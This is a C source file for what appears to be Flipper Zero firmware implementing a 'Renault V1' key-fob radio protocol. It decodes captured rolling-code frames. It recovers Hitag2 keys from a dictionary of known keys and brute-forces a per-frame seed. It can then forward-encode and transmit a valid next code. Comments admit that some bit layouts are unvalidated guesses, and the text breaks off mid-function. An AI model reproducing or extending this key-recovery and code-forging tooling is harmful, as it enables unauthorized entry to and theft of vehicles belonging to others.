#include "renault_v1.h"
// [HITAG2_BF] Renault V1 REUSES the Fiat V1 hitag2 cipher (do not duplicate it).
#include "fiat_v1.h"
// [HITAG2_SEED] Classic byte-array Hitag2 cipher + 4-byte SEED model. This is a
// SEPARATE, additive recovery/TX path (see hitag2_seed.c). It does NOT collide
// with the Fiat BCM cipher above nor with the Hitag2Hell BF engine.
#include "hitag2_seed.h"
#include "../blocks/const.h"
#include "../blocks/decoder.h"
#include "../blocks/encoder.h"
#include "../blocks/generic.h"
#include "../blocks/math.h"
#include <lib/toolbox/level_duration.h>
#include <string.h>

// [PROTOPIRATE_PORT] custom_btn support
#include "../blocks/custom_btn_i.h"

#define TAG "RenaultProtocolV1"

// ---------------------------------------------------------------------------
// Thanks to ZeroMega
//
// Thanks to AI for making probably a shitty code
//
// Renault V1 = the NON-type-0x13 variants split out of Renault V0.
//
// Renault V0's ONLY true type is 0x13 (proprietary matrix crypto). ALL other
// types (0x04, 0x0C, 0x1A, 0x3B, 0x3F, and the synthesized "Dynamic") are
// Hitag2-based rolling codes (Hell-recoverable like Fiat). Those live here in
// Renault V1. V1 has NO matrix crypto; it decodes the shared Manchester wire
// exactly like V0, but rejects 0x13 and adds Hitag2 key recovery.
//
// Mutual exclusion: V0 now rejects everything except 0x13; V1 rejects 0x13.
// The two are mutually exclusive regardless of registry order.
// ---------------------------------------------------------------------------

#define RENAULT_V1_MIN_BITS           0x52U // 82
#define RENAULT_V1_DECODER_BIT_LIMIT  0x6DU // 109
#define RENAULT_V1_SYNC_MIN_US        0x320U // 800
#define RENAULT_V1_GAP_RESET_US       5000U
#define RENAULT_V1_END_BURST_MIN_BITS 96U
#define RENAULT_V1_END_BURST_MIN_US   1200U
#define RENAULT_V1_END_BURST_MAX_US   2000U
#define RENAULT_V1_DECODED_BITS_MAX   0x70U // 112
#define RENAULT_V1_UPLOAD_CAPACITY    0x258U // 600
#define RENAULT_V1_TE_DEFAULT_US      125U
#define RENAULT_V1_TE_PREAMBLE_12_US  140U
#define RENAULT_V1_REPLAY_REPEAT      10U

// RENAULT_V1_KEY2_FIELD is now defined in renault_v1.h (exposed for the Seed BF scene).
#define RENAULT_V1_PREAMBLE_FIELD     "Preamble"
#define RENAULT_V1_HOP_FIELD          "Hop"
#define RENAULT_V1_HITAG2_KEY_FIELD   "Hitag2 Key"
#define RENAULT_V1_HITAG2_EPOCH_FIELD "Hitag2 Epoch"
#define RENAULT_V1_HITAG2_IV_FIELD    "Hitag2 IV"
#define RENAULT_V1_HITAG2_SLICE_FIELD "Hitag2 Slice"

static const uint8_t renault_v1_decoder_state_table[4] = {0x01, 0x91, 0x9B, 0xFB};

typedef enum {
    RenaultV1TypeUnknown = 0,
    RenaultV1Type04,
    RenaultV1Type0C,
    RenaultV1Type1A,
    RenaultV1Type3B,
    RenaultV1Type3F,
    RenaultV1TypeDynamic,
} RenaultV1TypeId;

typedef struct {
    RenaultV1TypeId id;
    uint8_t value;
    const char* name;
    uint8_t checksum_low6;
    uint8_t checksum_high2_xor;
} RenaultV1TypeEntry;

// Same checksum_low6/high2_xor values as V0 for the non-13 types. 0x13 EXCLUDED.
static const RenaultV1TypeEntry renault_v1_types[] = {
    {RenaultV1Type04, 0x04U, "04", 0x04U, 0x00U},
    {RenaultV1Type0C, 0x0CU, "0C", 0x0CU, 0x00U},
    {RenaultV1Type1A, 0x1AU, "1A", 0x1AU, 0x03U},
    {RenaultV1Type3B, 0x3BU, "3B", 0x3BU, 0x00U},
    {RenaultV1Type3F, 0x3FU, "3F", 0x3FU, 0x00U},
};

typedef struct {
    uint32_t te_short;
    uint32_t te_long;
    uint32_t te_delta;
} RenaultV1TeProfile;

// Shared TE profiles: auto-detected per-pulse, NOT per-type. Copied verbatim.
static const RenaultV1TeProfile renault_v1_te_profiles[] = {
    {0x7DU, 0xFAU, 0x45U}, // 125, 250, 69
    {124U, 248U, 60U},
    {108U, 250U, 55U},
};

typedef enum {
    RenaultV1DecoderStepReset = 0,
    RenaultV1DecoderStepData = 1,
} RenaultV1DecoderStep;

typedef struct {
    uint64_t data;
    uint32_t key2;
    uint32_t serial;
    uint8_t button;
    uint8_t counter;
    RenaultV1TypeId type_id;
    uint8_t type_tag;
    uint8_t preamble_bits;
    bool c1_ok;
    bool c2_ok;
} RenaultV1DecodeAttempt;

typedef struct SubGhzProtocolDecoderRenaultV1 {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint16_t packet_bit_count;
    uint8_t check_c1;
    uint8_t check_c2;

    uint32_t key2;

    uint8_t manchester_state;
    uint8_t decoded_bits[RENAULT_V1_DECODED_BITS_MAX];
    uint8_t decoded_bit_count;
    RenaultV1TypeId type_id;
    uint8_t type_tag;
    uint8_t preamble_bits;
    bool pending_attempt_valid;
    RenaultV1DecodeAttempt pending_attempt;

    // [HITAG2_BF] recovered hitag2 key + which slice / IV combo matched.
    uint8_t hitag2_key[6];
    uint32_t hitag2_epoch; // always 0 for Renault V1, kept for symmetry
    bool hitag2_key_valid;
    uint8_t hitag2_hop_slice; // 0..RENAULT_V1_HOP_SLICE_COUNT-1
    uint8_t hitag2_iv_combo; // 0..RENAULT_V1_IV_COMBO_COUNT-1
    uint32_t hitag2_hop; // the matched candidate hop

    // [HITAG2_SEED] classic-Hitag2 seed model (separate from the Fiat-BCM path).
    uint8_t seed_recovered; // HITAG2_SEED_RECOVERED_*
    uint32_t seed; // recovered 4-byte SEED (big-endian)
} SubGhzProtocolDecoderRenaultV1;

typedef struct SubGhzProtocolEncoderRenaultV1 {
    SubGhzProtocolEncoderBase base;
    SubGhzProtocolBlockEncoder encoder;
    SubGhzBlockGeneric generic;

    uint16_t packet_bit_count;
    uint8_t tx_button;
    uint8_t preamble_bits;
    uint32_t key2;

    // [HITAG2_SEED] classic-Hitag2 seed model (forward re-encode of NEXT code).
    uint8_t seed_recovered; // HITAG2_SEED_RECOVERED_*
    uint32_t seed; // recovered 4-byte SEED (big-endian)
} SubGhzProtocolEncoderRenaultV1;

typedef struct {
    uint8_t preamble_pairs;
    uint8_t burst_count;
    uint32_t te_short;
    uint32_t inter_burst_low;
    uint32_t final_low;
} RenaultV1UploadShape;

// candidate hop-slice start offsets, counted from the MSB of the 42-bit field.
// slice 0 -> bits 41..10, slice 1 -> bits 36..5, slice 2 -> bits 31..0.
// These are candidates pending real-capture validation.
static const uint8_t renault_v1_hop_slice_starts[RENAULT_V1_HOP_SLICE_COUNT] = {0U, 5U, 10U};

static bool renault_v1_type_button_valid(RenaultV1TypeId type_id, uint8_t button);
static const RenaultV1TypeEntry* renault_v1_find_type_by_checks(
    uint8_t checksum,
    uint32_t key2,
    bool* c1_ok,
    bool* c2_ok);
static bool renault_v1_checksum_hi2xor_valid(uint8_t hi2xor);
static bool renault_v1_button_valid_generic(uint8_t button);
static bool renault_v1_preamble_bits_valid(uint8_t preamble_bits);
static uint8_t renault_v1_default_preamble_bits(RenaultV1TypeId type_id);
static bool renault_v1_type_preamble_bits_valid(RenaultV1TypeId type_id, uint8_t preamble_bits);
static void
    renault_v1_parse_fields(uint64_t data, uint32_t* serial, uint8_t* button, uint8_t* counter);
static bool renault_v1_classify_event_profile(
    const RenaultV1TeProfile* profile,
    uint32_t duration,
    bool level,
    uint8_t* event_code);
static bool renault_v1_classify_event(uint32_t duration, bool level, uint8_t* event_code);
static bool renault_v1_is_end_burst(bool level, uint32_t duration, uint8_t bit_count);
static bool
    renault_v1_classify_frame(uint64_t data, uint32_t key2, RenaultV1DecodeAttempt* attempt);
static uint8_t renault_v1_checksum(uint64_t data, uint32_t key2);
static bool renault_v1_attempt_at_offset(
    const SubGhzProtocolDecoderRenaultV1* instance,
    uint8_t offset,
    RenaultV1DecodeAttempt* attempt);
static bool renault_v1_confirm_attempt(
    SubGhzProtocolDecoderRenaultV1* instance,
    const RenaultV1DecodeAttempt* attempt);
static bool renault_v1_get_bit_msb82(uint64_t data, uint32_t key2, uint8_t bit_index);
static void renault_v1_apply_attempt(
    SubGhzProtocolDecoderRenaultV1* instance,
    const RenaultV1DecodeAttempt* attempt);
static void renault_v1_decode_candidate(SubGhzProtocolDecoderRenaultV1* instance);
static void renault_v1_verify_hitag2_key(SubGhzProtocolDecoderRenaultV1* instance);

// [HITAG2_SEED] forward decls for the classic-Hitag2 SEED model helpers.
// [HITAG2_SEED] The heavy classic-Hitag2 SEED brute force is NOT run inline during
// decode/deserialize (it would block the receiver). It is exposed as a manual,
// on-demand public entry: subghz_protocol_renault_v1_run_seed_bf().
static bool renault_v1_encoder_reencode_seed(SubGhzProtocolEncoderRenaultV1* instance);
static void renault_v1_read_recovered_and_seed(
    FlipperFormat* flipper_format,
    uint8_t* recovered,
    uint32_t* seed);

static bool
    renault_v1_upload_shape_for_preamble(uint8_t preamble_bits, RenaultV1UploadShape* shape);
static uint32_t renault_v1_upload_te_for_preamble(uint8_t preamble_bits);
static bool renault_v1_emit(
    SubGhzProtocolEncoderRenaultV1* instance,
    size_t* index,
    bool level,
    uint32_t duration);
static bool renault_v1_emit_decoded_bit(
    SubGhzProtocolEncoderRenaultV1* instance,
    size_t* index,
    uint8_t* state,
    uint32_t te_short,
    bool bit);
static bool
    renault_v1_build_upload(SubGhzProtocolEncoderRenaultV1* instance, uint8_t preamble_bits);

static void subghz_protocol_decoder_renault_v1_free(void* context) {
    furi_assert(context);
    free(context);
}

const SubGhzProtocolDecoder subghz_protocol_renault_v1_decoder = {
    .alloc = subghz_protocol_decoder_renault_v1_alloc,
    .free = subghz_protocol_decoder_renault_v1_free,
    .feed = subghz_protocol_decoder_renault_v1_feed,
    .reset = subghz_protocol_decoder_renault_v1_reset,
    .get_hash_data = subghz_protocol_decoder_renault_v1_get_hash_data,
    .get_string = subghz_protocol_decoder_renault_v1_get_string,
    .serialize = subghz_protocol_decoder_renault_v1_serialize,
    .deserialize = subghz_protocol_decoder_renault_v1_deserialize,
};

const SubGhzProtocolEncoder subghz_protocol_renault_v1_encoder = {
    .alloc = subghz_protocol_encoder_renault_v1_alloc,
    .free = subghz_protocol_encoder_renault_v1_free,
    .deserialize = subghz_protocol_encoder_renault_v1_deserialize,
    .stop = subghz_protocol_encoder_renault_v1_stop,
    .yield = subghz_protocol_encoder_renault_v1_yield,
};

const SubGhzProtocol renault_v1_protocol = {
    .name = RENAULT_PROTOCOL_V1_NAME,
    .type = SubGhzProtocolTypeDynamic,
    .flag = SubGhzProtocolFlag_Decodable | SubGhzProtocolFlag_315 | SubGhzProtocolFlag_433 |
            SubGhzProtocolFlag_868 | SubGhzProtocolFlag_AM | SubGhzProtocolFlag_Save |
            SubGhzProtocolFlag_Load | SubGhzProtocolFlag_Send,

    .encoder = &subghz_protocol_renault_v1_encoder,
    .decoder = &subghz_protocol_renault_v1_decoder,
};

static bool renault_v1_type_button_valid(RenaultV1TypeId type_id, uint8_t button) {
    switch(type_id) {
    case RenaultV1Type04:
        return (button >= 0x04U) && (button <= 0x0BU);
    case RenaultV1Type0C:
        return (button >= 0xC4U) && (button <= 0xCBU);
    case RenaultV1Type1A:
    case RenaultV1Type3B:
        return (button >= 0x44U) && (button <= 0x4BU);
    case RenaultV1Type3F:
        return (button >= 0xC4U) && (button <= 0xCBU);
    case RenaultV1TypeDynamic:
        return false;
    default:
        return false;
    }
}

static const RenaultV1TypeEntry* renault_v1_find_type_by_checks(
    uint8_t checksum,
    uint32_t key2,
    bool* c1_ok,
    bool* c2_ok) {
    const uint8_t checksum_low6 = checksum & 0x3FU;
    const uint8_t checksum_high2_xor = (uint8_t)(((checksum >> 6U) & 0x03U) ^ (key2 & 0x03U));

    if(c1_ok) {
        *c1_ok = false;
    }
    if(c2_ok) {
        *c2_ok = false;
    }

    for(size_t i = 0; i < COUNT_OF(renault_v1_types); i++) {
        const RenaultV1TypeEntry* type = &renault_v1_types[i];
        if(checksum_low6 != type->checksum_low6) {
            continue;
        }

        if(c1_ok) {
            *c1_ok = true;
        }
        if(checksum_high2_xor != type->checksum_high2_xor) {
            return NULL;
        }

        if(c2_ok) {
            *c2_ok = true;
        }
        return type;
    }

    return NULL;
}

static bool renault_v1_checksum_hi2xor_valid(uint8_t hi2xor) {
    return (hi2xor == 0x00U) || (hi2xor == 0x03U);
}

static bool renault_v1_button_valid_generic(uint8_t button) {
    if((button == 0x06U) || (button == 0x0AU)) {
        return true;
    }
    if((button >= 0x04U) && (button <= 0x0BU)) {
        return true;
    }
    if((button >= 0x44U) && (button <= 0x4BU)) {
        return true;
    }
    if((button >= 0xC4U) && (button <= 0xCBU)) {
        return true;
    }
    return false;
}

static bool renault_v1_preamble_bits_valid(uint8_t preamble_bits) {
    switch(preamble_bits) {
    case 12U:
    case 16U:
    case 18U:
    case 20U:
        return true;
    default:
        return false;
    }
}

static uint8_t renault_v1_default_preamble_bits(RenaultV1TypeId type_id) {
    switch(type_id) {
    case RenaultV1Type04:
        return 16U;
    case RenaultV1Type0C:
        return 18U;
    case RenaultV1Type1A:
        return 12U;
    case RenaultV1Type3B:
    case RenaultV1Type3F:
        return 20U;
    default:
        return 0U;
    }
}

static bool renault_v1_type_preamble_bits_valid(RenaultV1TypeId type_id, uint8_t preamble_bits) {
    if(type_id == RenaultV1TypeDynamic) {
        return renault_v1_preamble_bits_valid(preamble_bits);
    }

    return preamble_bits == renault_v1_default_preamble_bits(type_id);
}

static void
    renault_v1_parse_fields(uint64_t data, uint32_t* serial, uint8_t* button, uint8_t* counter) {
    if(serial) {
        *serial = (uint32_t)(data >> 40U);
    }
    if(button) {
        *button = (uint8_t)(data >> 32U);
    }
    if(counter) {
        *counter = (uint8_t)(((uint32_t)data >> 24U) & 0xFFU);
    }
}

static bool renault_v1_classify_event_profile(
    const RenaultV1TeProfile* profile,
    uint32_t duration,
    bool level,
    uint8_t* event_code) {
    furi_check(event_code);
    furi_check(profile);

    const uint32_t te_short = profile->te_short;
    const uint32_t te_long = profile->te_long;
    const uint32_t te_delta = profile->te_delta;

    if(duration <= (te_short - 1U)) {
        if((te_short - duration) > te_delta) {
            return false;
        }
        *event_code = (uint8_t)(((level ? 1U : 0U) ^ 1U) << 1U);
        return true;
    }

    if(duration <= (te_long - 1U)) {
        const uint32_t short_delta = duration - te_short;
        const uint32_t long_inv_delta = te_long - duration;

        if(short_delta <= te_delta) {
            if(long_inv_delta > te_delta) {
                *event_code = (uint8_t)(((level ? 1U : 0U) ^ 1U) << 1U);
            } else {
                *event_code = level ? 4U : 6U;
            }
            return true;
        }

        if(long_inv_delta <= te_delta) {
            *event_code = level ? 4U : 6U;
            return true;
        }

        return false;
    }

    if((duration - te_long) > te_delta) {
        return false;
    }

    *event_code = level ? 4U : 6U;
    return true;
}

static bool renault_v1_classify_event(uint32_t duration, bool level, uint8_t* event_code) {
    for(size_t i = 0; i < COUNT_OF(renault_v1_te_profiles); i++) {
        if(renault_v1_classify_event_profile(
               &renault_v1_te_profiles[i], duration, level, event_code)) {
            return true;
        }
    }
    return false;
}

static bool renault_v1_is_end_burst(bool level, uint32_t duration, uint8_t bit_count) {
    return (!level) && (bit_count >= RENAULT_V1_END_BURST_MIN_BITS) &&
           (duration >= RENAULT_V1_END_BURST_MIN_US) && (duration <= RENAULT_V1_END_BURST_MAX_US);
}

// Classify a candidate frame. V1 accepts non-13 known types + Dynamic.
// If the checksum resolves to type 0x13 it must be REJECTED here (that belongs
// to Renault V0). Since 0x13 is absent from renault_v1_types, the type lookup
// never yields it; the Dynamic path additionally rejects the 0x13 checksum tag.
static bool
    renault_v1_classify_frame(uint64_t data, uint32_t key2, RenaultV1DecodeAttempt* attempt) {
    furi_check(attempt);

    uint32_t serial = 0U;
    uint8_t button = 0U;
    uint8_t counter = 0U;
    renault_v1_parse_fields(data, &serial, &button, &counter);

    const uint8_t checksum = renault_v1_checksum(data, key2);
    const uint8_t checksum_low6 = checksum & 0x3FU;
    const uint8_t checksum_high2_xor = (uint8_t)(((checksum >> 6U) & 0x03U) ^ (key2 & 0x03U));
    bool c1_ok = false;
    bool c2_ok = false;
    const RenaultV1TypeEntry* type = renault_v1_find_type_by_checks(checksum, key2, &c1_ok, &c2_ok);

    attempt->data = data;
    attempt->key2 = key2;
    attempt->serial = serial;
    attempt->button = button;
    attempt->counter = counter;
    attempt->c1_ok = c1_ok;
    attempt->c2_ok = c2_ok;

    if(type && c1_ok && c2_ok && renault_v1_type_button_valid(type->id, button)) {
        attempt->type_id = type->id;
        attempt->type_tag = type->value;
        return true;
    }

    // [SPLIT] Reject the type-0x13 checksum tag: it belongs to Renault V0.
    if(checksum_low6 == 0x13U) {
        return false;
    }

    const bool dynamic_c1_ok =
        renault_v1_button_valid_generic(button) && (serial != 0U) && (serial <= 0xFFFFFFU);
    const bool dynamic_c2_ok = renault_v1_checksum_hi2xor_valid(checksum_high2_xor);
    attempt->c1_ok = dynamic_c1_ok;
    attempt->c2_ok = dynamic_c2_ok;

    if(dynamic_c1_ok && dynamic_c2_ok) {
        attempt->type_id = RenaultV1TypeDynamic;
        attempt->type_tag = checksum_low6;
        return true;
    }

    return false;
}

static void renault_v1_u64_to_bytes_be(uint64_t data, uint8_t bytes[8]) {
    for(size_t i = 0; i < 8; i++) {
        bytes[i] = (uint8_t)((data >> ((7U - i) * 8U)) & 0xFFU);
    }
}

static uint8_t renault_v1_checksum(uint64_t data, uint32_t key2) {
    uint8_t bytes[10];
    renault_v1_u64_to_bytes_be(data, bytes);
    bytes[8] = (uint8_t)((key2 >> 10U) & 0xFFU);
    bytes[9] = (uint8_t)((key2 >> 2U) & 0xFFU);

    uint8_t checksum = 0U;
    for(size_t i = 0; i < COUNT_OF(bytes); i++) {
        checksum ^= bytes[i];
    }
    return checksum;
}

static bool renault_v1_attempt_at_offset(
    const SubGhzProtocolDecoderRenaultV1* instance,
    uint8_t offset,
    RenaultV1DecodeAttempt* attempt) {
    furi_check(attempt);

    if(((uint32_t)offset + 82U) > instance->decoded_bit_count) {
        return false;
    }

    uint64_t data = 0ULL;
    for(uint8_t i = 0; i < 64U; i++) {
        data = (data << 1U) | (uint64_t)(instance->decoded_bits[offset + i] & 1U);
    }

    uint32_t key2 = 0U;
    for(uint8_t i = 0; i < 18U; i++) {
        key2 = (key2 << 1U) | (uint32_t)(instance->decoded_bits[offset + 64U + i] & 1U);
    }

    if(!renault_v1_classify_frame(data, key2, attempt)) {
        return false;
    }

    attempt->preamble_bits = offset;
    if(!renault_v1_type_preamble_bits_valid(attempt->type_id, attempt->preamble_bits)) {
        return false;
    }

    return true;
}

static bool renault_v1_confirm_attempt(
    SubGhzProtocolDecoderRenaultV1* instance,
    const RenaultV1DecodeAttempt* attempt) {
    if(attempt->type_id != RenaultV1TypeDynamic) {
        instance->pending_attempt_valid = false;
        return true;
    }

    if(instance->pending_attempt_valid && (instance->pending_attempt.data == attempt->data) &&
       (instance->pending_attempt.key2 == attempt->key2) &&
       (instance->pending_attempt.type_id == attempt->type_id) &&
       (instance->pending_attempt.type_tag == attempt->type_tag) &&
       (instance->pending_attempt.preamble_bits == attempt->preamble_bits)) {
        instance->pending_attempt_valid = false;
        return true;
    }

    instance->pending_attempt = *attempt;
    instance->pending_attempt_valid = true;
    return false;
}

static bool renault_v1_get_bit_msb82(uint64_t data, uint32_t key2, uint8_t bit_index) {
    if(bit_index <= 0x3FU) {
        return ((data >> (63U - bit_index)) & 1ULL) != 0ULL;
    }

    return ((key2 >> (0x51U - bit_index)) & 1U) != 0U;
}

static void renault_v1_apply_attempt(
    SubGhzProtocolDecoderRenaultV1* instance,
    const RenaultV1DecodeAttempt* attempt) {
    instance->generic.data = attempt->data;
    instance->decoder.decode_data = attempt->data;
    instance->packet_bit_count = RENAULT_V1_MIN_BITS;
    instance->decoder.decode_count_bit = RENAULT_V1_MIN_BITS;
    instance->key2 = attempt->key2;
    instance->generic.data_count_bit = RENAULT_V1_MIN_BITS;
    instance->generic.serial = attempt->serial;
    instance->generic.cnt = attempt->counter;
    instance->generic.btn = attempt->button;
    instance->type_id = attempt->type_id;
    instance->type_tag = attempt->type_tag;
    instance->preamble_bits = attempt->preamble_bits;
    instance->check_c1 = !attempt->c1_ok;
    instance->check_c2 = !attempt->c2_ok;

    // [HITAG2_BF] attempt to recover the hitag2 key for the just-decoded frame.
    renault_v1_verify_hitag2_key(instance);

    // [HITAG2_SEED] NOTE: the classic-Hitag2 4-byte SEED brute force
    // (~0x40000 candidates * full cipher) is DELIBERATELY
    // NOT run here. Doing it inline during live capture would block the receiver
    // for hundreds of ms per frame and drop subsequent button presses. The SEED
    // recovery is a MANUAL, on-demand action triggered from the saved-signal
    // "Seed BF" menu via subghz_protocol_renault_v1_run_seed_bf(). Live capture
    // stays fast; a captured frame stays replay-capable until the user opts in.
    instance->seed_recovered = HITAG2_SEED_RECOVERED_NO;
    instance->seed = 0U;
    instance->generic.seed = 0U;
}

static void renault_v1_decode_candidate(SubGhzProtocolDecoderRenaultV1* instance) {
    if(instance->decoded_bit_count <= 0x51U) {
        return;
    }

    const uint8_t tail_offset = instance->decoded_bit_count - RENAULT_V1_MIN_BITS;
    if(!renault_v1_preamble_bits_valid(tail_offset)) {
        instance->pending_attempt_valid = false;
        instance->packet_bit_count = 0U;
        instance->generic.data_count_bit = 0U;
        return;
    }

    RenaultV1DecodeAttempt attempt = {0};
    if(!renault_v1_attempt_at_offset(instance, tail_offset, &attempt)) {
        instance->pending_attempt_valid = false;
        instance->packet_bit_count = 0U;
        instance->generic.data_count_bit = 0U;
        return;
    }

    if(!renault_v1_confirm_attempt(instance, &attempt)) {
        instance->decoded_bit_count = 0U;
        return;
    }

    if((instance->packet_bit_count != 0U) && (instance->generic.data == attempt.data) &&
       (instance->key2 == attempt.key2)) {
        instance->decoded_bit_count = 0U;
        return;
    }

    renault_v1_apply_attempt(instance, &attempt);
    instance->decoded_bit_count = 0U;

    if(instance->packet_bit_count && instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }
}

// ---------------------------------------------------------------------------
// [HITAG2_BF] Hitag2 key recovery with auto-detection of BOTH the hop bit-slice
// AND the IV combo.
//
// The 32-bit hop lives somewhere in the 42 payload bits (data[23:0] + key2[17:0]),
// but its EXACT position is UNKNOWN (pending real capture). We try a small set
// of candidate 32-bit slices. The IV normalization (button/control) is also
// unknown, so we try 4 combos (2 button x 2 control), mirroring Fiat V2.
//
// For each known key x each hop slice x each IV combo, we compute
//   auth = subghz_protocol_fiat_v1_compute_auth(uid, iv_button, iv_control, key, 0)
// and if it equals the candidate hop, we record everything and stop. This is
// FIAT_V1_KNOWN_KEY_COUNT x 3 x 4 = 96 auth computations, cheap.
//
// IMPORTANT CAVEAT: if Renault's cipher / IV layout / tap positions differ from
// Fiat's, NONE of the candidates will validate and hitag2_key_valid stays false.
// That is graceful: the protocol still decodes and emulates as a replay. The
// auto-detection makes key recovery "just work" IF Renault shares Fiat's Hitag2
// cipher. All hop-slice offsets and IV combos here are pending validation
// against a real capture.
// ---------------------------------------------------------------------------

uint64_t subghz_protocol_renault_v1_payload42(uint64_t data, uint32_t key2) {
    // data[23:0] as the top 24 bits, key2[17:0] as the low 18 bits.
    const uint64_t data_low24 = (uint64_t)(data & 0xFFFFFFULL);
    const uint64_t key2_low18 = (uint64_t)(key2 & 0x3FFFFUL);
    return (data_low24 << 18U) | key2_low18;
}

uint32_t subghz_protocol_renault_v1_candidate_hop(uint64_t payload42, uint8_t slice) {
    if(slice >= RENAULT_V1_HOP_SLICE_COUNT) {
        return 0U;
    }
    const uint8_t start = renault_v1_hop_slice_starts[slice];
    // hop = (payload42 >> (42 - 32 - start)) & 0xFFFFFFFF
    const uint8_t shift = (uint8_t)(42U - 32U - start);
    return (uint32_t)((payload42 >> shift) & 0xFFFFFFFFULL);
}

uint8_t subghz_protocol_renault_v1_iv_button(uint8_t button, uint8_t combo) {
    const uint8_t low_nibble = (uint8_t)(button & 0x0FU);
    if((combo & 0x01U) == 0U) {
        // option A: low nibble of the button byte directly.
        return low_nibble;
    }
    // option B: one-hot remap of the low nibble's lock/unlock/other class.
    if((low_nibble >= 0x04U) && (low_nibble <= 0x07U)) {
        return 0x2U; // lock
    }
    if((low_nibble >= 0x08U) && (low_nibble <= 0x0BU)) {
        return 0x4U; // unlock
    }
    return 0x1U;
}

uint16_t subghz_protocol_renault_v1_iv_control(uint8_t counter, uint8_t combo) {
    const uint16_t cnt = (uint16_t)((uint16_t)counter & 0x3FFU);
    if((combo & 0x02U) == 0U) {
        return cnt;
    }
    return (uint16_t)((~cnt) & 0x3FFU);
}

static void renault_v1_verify_hitag2_key(SubGhzProtocolDecoderRenaultV1* instance) {
    instance->hitag2_key_valid = false;
    instance->hitag2_epoch = 0U;
    instance->hitag2_hop_slice = 0U;
    instance->hitag2_iv_combo = 0U;
    instance->hitag2_hop = 0U;
    memset(instance->hitag2_key, 0, sizeof(instance->hitag2_key));

    const uint32_t uid = instance->generic.serial & 0xFFFFFFUL; // 24-bit, zero-extended
    const uint8_t button = instance->generic.btn;
    const uint8_t counter = instance->generic.cnt;
    const uint64_t payload42 =
        subghz_protocol_renault_v1_payload42(instance->generic.data, instance->key2);

    const uint8_t(*known_keys)[6] = subghz_protocol_fiat_v1_get_known_keys();

    for(uint8_t i = 0U; i < FIAT_V1_KNOWN_KEY_COUNT; i++) {
        for(uint8_t slice = 0U; slice < RENAULT_V1_HOP_SLICE_COUNT; slice++) {
            const uint32_t hop = subghz_protocol_renault_v1_candidate_hop(payload42, slice);
            for(uint8_t combo = 0U; combo < RENAULT_V1_IV_COMBO_COUNT; combo++) {
                const uint8_t iv_btn = subghz_protocol_renault_v1_iv_button(button, combo);
                const uint16_t iv_ctrl = subghz_protocol_renault_v1_iv_control(counter, combo);
                const uint32_t auth =
                    subghz_protocol_fiat_v1_compute_auth(uid, iv_btn, iv_ctrl, known_keys[i], 0U);
                if(auth == hop) {
                    memcpy(instance->hitag2_key, known_keys[i], sizeof(instance->hitag2_key));
                    instance->hitag2_key_valid = true;
                    instance->hitag2_epoch = 0U;
                    instance->hitag2_hop_slice = slice;
                    instance->hitag2_iv_combo = combo;
                    instance->hitag2_hop = hop;
                    return;
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// [HITAG2_SEED] Classic-Hitag2 SEED model (ported from ProtoPirate).
//
// A SECOND, independent recovery/TX path built on the classic byte-array cipher
// in hitag2_seed.c. Unlike the Fiat-BCM path above (which recovers a 6-byte key
// from a small dictionary), this path recovers a 4-byte SEED for the exact
// captured frame and can forward-encode a valid NEXT code with
// hitag2_seed_encrypt_frame(serial, cnt, btn, seed).
//
// Frame bridging: the classic cipher works on an 11-byte wire frame
// (raw[0..3]=serial_be, raw[4..9]=btn/cnt/hop, raw[10]=XOR). The lib packs its
// captured bits as `data` (64-bit, big-endian = raw[0..7]) plus `key2`
// (18-bit). We reconstruct the 11-byte frame from those bytes the same way the
// BF scene derives payload42 from data+key2, so the classic BF sees the same
// captured bytes it would have seen in ProtoPirate.
// ---------------------------------------------------------------------------

// Pack the lib's `data` (64-bit) + `key2` (18-bit) into an 11-byte classic frame.
// data occupies raw[0..7] (big-endian); the low 18 bits of key2 are placed into
// raw[8..10] MSB-first (raw[8]=key2[17:10], raw[9]=key2[9:2], raw[10]=key2[1:0]).
static void renault_v1_seed_pack_frame(uint64_t data, uint32_t key2, uint8_t frame[11]) {
    for(size_t i = 0; i < 8; i++) {
        frame[i] = (uint8_t)((data >> ((7U - i) * 8U)) & 0xFFU);
    }
    const uint32_t key2_18 = key2 & 0x3FFFFUL;
    frame[8] = (uint8_t)((key2_18 >> 10U) & 0xFFU);
    frame[9] = (uint8_t)((key2_18 >> 2U) & 0xFFU);
    frame[10] = (uint8_t)((key2_18 & 0x03U) << 6U);
}

// Unpack an 11-byte classic frame back into the lib's `data` + `key2`.
static void renault_v1_seed_unpack_frame(const uint8_t frame[11], uint64_t* data, uint32_t* key2) {
    uint64_t d = 0ULL;
    for(size_t i = 0; i < 8; i++) {
        d = (d << 8U) | frame[i];
    }
    *data = d;
    const uint32_t key2_18 = (((uint32_t)frame[8]) << 10U) | (((uint32_t)frame[9]) << 2U) |
                             (((uint32_t)frame[10] >> 6U) & 0x03U);
    *key2 = key2_18 & 0x3FFFFUL;
}

// [HITAG2_SEED] Public, stateless manual seed brute force. The saved-signal
// "Seed BF" scene calls this on demand (NOT during live capture) with the
// decoded frame's `data`(64b) + `key2`(18b). Runs the ~0x40000-candidate classic
// Hitag2 brute force and, on success, writes the recovered 4-byte SEED to
// *seed_out and returns true. This is the ONLY place the heavy brute force runs,
// so live capture is never blocked.
bool subghz_protocol_renault_v1_run_seed_bf(uint64_t data, uint32_t key2, uint32_t* seed_out) {
    return subghz_protocol_renault_v1_run_seed_bf_ex(data, key2, seed_out, NULL, NULL);
}

bool subghz_protocol_renault_v1_run_seed_bf_ex(
    uint64_t data,
    uint32_t key2,
    uint32_t* seed_out,
    Hitag2SeedProgressCallback progress_cb,
    void* progress_ctx) {
    uint8_t frame[11];
    renault_v1_seed_pack_frame(data, key2, frame);
    frame[10] = (uint8_t)(hitag2_seed_frame_xor(frame) | (frame[10] & 0xC0U));

    uint8_t iv[4];
    if(hitag2_seed_recover_ex(frame, iv, progress_cb, progress_ctx)) {
        if(seed_out) *seed_out = hitag2_seed_from_iv(iv);
        return true;
    }
    return false;
}

// Forward re-encode: build the NEXT frame from serial+cnt+btn+seed using the
// classic cipher and repack it into the lib's `data` + `key2`. Returns false if
// no seed has been recovered (nothing to forward-encode with).
static bool renault_v1_encoder_reencode_seed(SubGhzProtocolEncoderRenaultV1* instance) {
    if(instance->seed_recovered != HITAG2_SEED_RECOVERED_YES) {
        return false;
    }

    uint8_t out[11];
    uint8_t iv[4];
    hitag2_seed_encrypt_frame(
        instance->generic.serial,
